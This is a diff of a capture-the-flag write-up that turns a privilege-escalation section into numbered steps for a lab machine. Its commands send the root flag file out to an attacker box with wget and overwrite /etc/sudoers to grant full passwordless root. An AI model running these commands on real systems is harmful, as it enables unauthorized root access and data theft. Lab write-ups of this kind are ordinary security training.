@@ -31,12 +31,19 @@ sudo wget --post-file=/root/root_flag.txt http://<Attackbox IP>:9000
 ```
 ### Root Shell
 
-gtfobin has exploits listed for file upload/download/read
-To get a shell with admin privileges we first get the file using the same way as with the flag, we edit the sudoers file locally by adding our own settings for the user.`/etc/sudoers`
+1. `gtfobin` has exploits listed for file upload/download/read of `wget`
+2. To get a shell with admin privileges we first get the file using the same way as with the flag, we edit the `sudoers` file locally by adding our own settings for the user.`/etc/sudoers`
 ```
 #jessie  ALL=(root) NOPASSWD: /usr/bin/wget
 jessie  ALL=(ALL) NOPASSWD: ALL
 ```
+3. we raise a server with python3 in the path where our `sudoers` file is .
+4. And in the wgel machine we execute the `wget`(to get the new `sudoers` file from our device to the wgel machine) command with `sudo` which will overwrite the `/etc/sudoers`. **We locate ourselves in the folder of `/etc/`** and execute:
+```
+sudo /usr/bin/wget <Attackbox IP>/sudoers --output-document=sudoers
+```
+5. then run `sudo su`
+
 
 
 ### References
